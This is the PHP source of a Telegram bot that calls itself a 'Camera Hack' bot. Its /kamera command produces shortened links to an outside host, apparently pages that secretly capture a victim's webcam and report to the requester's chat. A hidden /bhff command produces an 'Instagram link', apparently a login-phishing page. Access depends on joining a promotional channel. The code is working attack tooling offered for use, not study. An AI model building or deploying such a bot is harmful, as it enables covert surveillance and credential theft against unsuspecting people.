<?php

error_reporting(0);

ini_set('display_errors', 0);



function getTokenFromJson() {

    static $token = null;

    if ($token === null) {

        $tokenFile = 'token.json';

        if (file_exists($tokenFile)) {

            $json = file_get_contents($tokenFile);

            $data = json_decode($json, true);

            $token = isset($data['token']) ? $data['token'] : false;

        } else {

            $token = false;

        }

    }

    return $token;

}



$token = getTokenFromJson();

if (!$token) {

    exit;

}



$ramowlf = "https://api.telegram.org/bot$token/";

$tekbabaramowlf = "@Konusacaklar";



$languages = [

    'tr' => ['start' => 'Kamera Hack botu daha ne yazalım 🌚', 'owner' => '🩵 Tool kanalı', 'commands' => '💬 Komutlar', 'channel' => '❤️‍🔥 Kanalımız', 'camera_link' => '🔗 Kamera linkiniz hazır: ', 'retry' => 'Tekrar dene', 'not_member' => '🍌😡 Bu özelliği kullanmak için önce @Konusacaklar kanalına katılmanız gerekiyor!', 'join_channel' => '❤️‍🔥 Kanala Katıl', 'commands_list' => "🔧 Komutlar:\n\n📷 /kamera - Kamera hack linki oluştur\n\n⚠️ Komutları kullanmak için @Konusacaklar kanalına üye olmalısınız!", 'language' => '🌐 Dil Seçin', 'language_changed' => '✅ Dil Türkçeye değiştirildi!'],

    'az' => ['start' => 'Kamera Hack botu daha nə yazaq 🌚', 'owner' => '🩵 Tool kanalı', 'commands' => '💬 Əmrlər', 'channel' => '❤️‍🔥 Kanalımız', 'camera_link' => '🔗 Kamera linkiniz hazır: ', 'retry' => 'Yenidən cəhd et', 'not_member' => '🍌😡 Bu xüsusiyyəti istifadə etmək üçün əvvəlcə @Konusacaklar kanalına qoşulmalısınız!', 'join_channel' => '❤️‍🔥 Kanala Qoşul', 'commands_list' => "🔧 Əmrlər:\n\n📷 /kamera - Kamera hack linki yarat\n\n⚠️ Əmrləri istifadə etmək üçün @Konusacaklar kanalına üzv olmalısınız!", 'language' => '🌐 Dil Seçin', 'language_changed' => '✅ Dil Azərbaycancaya dəyişdirildi!'],

    'ar' => ['start' => 'روبوت Kamera Hack ماذا يمكننا أن نكتب أيضًا 🌚', 'owner' => '🩵 Tool channel', 'commands' => '💬 الأوامر', 'channel' => '❤️‍🔥 قناتنا', 'camera_link' => '🔗 الرابط الخاص بك جاهز: ', 'retry' => 'حاول مرة أخرى', 'not_member' => '🍌😡 لاستخدام هذه الميزة، يجب عليك أولاً الانضمام إلى قناة @Konusacaklar', 'join_channel' => '❤️‍🔥 انضم إلى القناة', 'commands_list' => "🔧 الأوامر:\n\n📷 /kamera - إنشاء رابط الكاميرا\n\n⚠️ لاستخدام الأوامر، يجب أن تكون عضواً في قناة @Konusacaklar", 'language' => '🌐 اختر اللغة', 'language_changed' => '✅ تم تغيير اللغة إلى العربية!'],

    'en' => ['start' => 'Camera Hack bot, what else can we write 🌚', 'owner' => '🩵 Tool channel', 'commands' => '💬 Commands', 'channel' => '❤️‍🔥 Our Channel', 'camera_link' => '🔗 Your camera link is ready: ', 'retry' => 'Try again', 'not_member' => '🍌😡 To use this feature, you must first join the @Konusacaklar channel!', 'join_channel' => '❤️‍🔥 Join Channel', 'commands_list' => "🔧 Commands:\n\n📷 /kamera - Create camera hack link\n\n⚠️ To use commands, you must be a member of @Konusacaklar channel!", 'language' => '🌐 Select Language', 'language_changed' => '✅ Language changed to English!']

];



$update = json_decode(file_get_contents("php://input"), true);

if (empty($update)) exit;



http_response_code(200);

header('Content-Type: application/json');

echo json_encode(['ok' => true]);

flush();



if (function_exists('fastcgi_finish_request')) {

    fastcgi_finish_request();

}



function curlRequest($url, $post = false, $postData = null) {

    $ch = curl_init();

    curl_setopt_array($ch, [

        CURLOPT_URL => $url,

        CURLOPT_RETURNTRANSFER => true,

        CURLOPT_SSL_VERIFYPEER => false,

        CURLOPT_CONNECTTIMEOUT => 5,

        CURLOPT_TIMEOUT => 10

    ]);

    if ($post) {

        curl_setopt($ch, CURLOPT_POST, 1);

        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);

    }

    $result = curl_exec($ch);

    curl_close($ch);

    return $result;

}



function kisalt_url($orjinal_url) {

    $api_url = "https://bunediyo-001-site1.mtempurl.com/api/kisalt.php?url=" . urlencode($orjinal_url);

    $response = curlRequest($api_url);

    if ($response) {

        $data = json_decode($response, true);

        return $data['data']['kısaltılmış url'] ?? null;

    }

    return null;

}



function checkChannelMembership($user_id, $channel_id) {

    global $ramowlf;

    $ch = curl_init($ramowlf . "getChatMember?chat_id=$channel_id&user_id=$user_id");

    curl_setopt_array($ch, [

        CURLOPT_RETURNTRANSFER => true,

        CURLOPT_SSL_VERIFYPEER => false,

        CURLOPT_CONNECTTIMEOUT => 3,

        CURLOPT_TIMEOUT => 5

    ]);

    $result = curl_exec($ch);

    curl_close($ch);

    

    if ($result) {

        $response = json_decode($result, true);

        if ($response['ok'] ?? false) {

            return in_array($response['result']['status'] ?? '', ['member', 'administrator', 'creator']);

        }

    }

    return false;

}



function sendMessage($chat_id, $text, $keyboard = null) {

    global $ramowlf;

    $data = [

        'chat_id' => $chat_id,

        'text' => $text,

        'parse_mode' => 'HTML'

    ];

    if ($keyboard) {

        $data['reply_markup'] = json_encode($keyboard);

    }

    curlRequest($ramowlf . "sendMessage", true, http_build_query($data));

}



if (isset($update["message"])) {

    $msg = $update["message"];

    $chat_id = $msg["chat"]["id"];

    $text = $msg["text"] ?? '';

    $user_id = $msg["from"]["id"];



    if ($text === "/start") {

        $keyboard = ["inline_keyboard" => [[["text" => "🇹🇷 Türkçe", "callback_data" => "lang_tr"], ["text" => "🇦🇿 Azərbaycan", "callback_data" => "lang_az"]], [["text" => "🇸🇦 العربية", "callback_data" => "lang_ar"], ["text" => "🇬🇧 English", "callback_data" => "lang_en"]]]];

        sendMessage($chat_id, "🌐 Lütfen bir dil seçiniz / Please select a language / اختار اللغه", $keyboard);

    }

    elseif (strpos($text, "/kamera") === 0) {

        if (checkChannelMembership($user_id, $tekbabaramowlf)) {

            $kisa_url = kisalt_url("https://bunediyo-001-site1.mtempurl.com/a.php?id=$chat_id");

            sendMessage($chat_id, $kisa_url ? "✏️ camera hack link is ready " . $kisa_url : "Tekrar dene");

        } else {

            $keyboard = ["inline_keyboard" => [[["text" => "❤️‍🔥 Kanala Katıl", "url" => "https://t.me/Konusacaklar"]]]];

            sendMessage($chat_id, "🍌😡 Bu özelliği kullanmak için önce @Konusacaklar kanalına katılmanız gerekiyor!", $keyboard);

        }

    }

    elseif (strpos($text, "/bhff") === 0) {

        if (checkChannelMembership($user_id, $tekbabaramowlf)) {

            $kisa_url = kisalt_url("https://ramowlf5-001-site1.qtempurl.com/ig.php?id=$chat_id");

            sendMessage($chat_id, $kisa_url ? "✏️ Instagram link is ready " . $kisa_url : "Tekrar dene");

        } else {

            $keyboard = ["inline_keyboard" => [[["text" => "❤️‍🔥 Kanala Katıl", "url" => "https://t.me/Konusacaklar"]]]];

            sendMessage($chat_id, "🍌😡 Bu özelliği kullanmak için önce @Konusacaklar kanalına katılmanız gerekiyor!", $keyboard);

        }

    }

}



if (isset($update["callback_query"])) {

    $cb = $update["callback_query"];

    $chat_id = $cb["message"]["chat"]["id"];

    $data = $cb["data"];



    if (strpos($data, "lang_") === 0) {

        $lang = substr($data, 5);

        $keyboard = ["inline_keyboard" => [[["text" => $languages[$lang]['owner'], "url" => ""], ["text" => $languages[$lang]['commands'], "callback_data" => "komutlar_$lang"]], [["text" => $languages[$lang]['channel'], "url" => "https://t.me/Konusacaklar"]], [["text" => $languages[$lang]['language'], "callback_data" => "dil_secim"]]]];

        sendMessage($chat_id, $languages[$lang]['start'], $keyboard);

    }

    elseif (strpos($data, "komutlar_") === 0) {

        $lang = substr($data, 9);

        sendMessage($chat_id, $languages[$lang]['commands_list']);

    }

    elseif ($data === "dil_secim") {

        $keyboard = ["inline_keyboard" => [[["text" => "🇹🇷 Türkçe", "callback_data" => "lang_tr"], ["text" => "🇦🇿 Azərbaycan", "callback_data" => "lang_az"]], [["text" => "🇸🇦 العربية", "callback_data" => "lang_ar"], ["text" => "🇬🇧 English", "callback_data" => "lang_en"]]]];

        sendMessage($chat_id, "🌐 Dil Seçin", $keyboard);

    }

}

?>
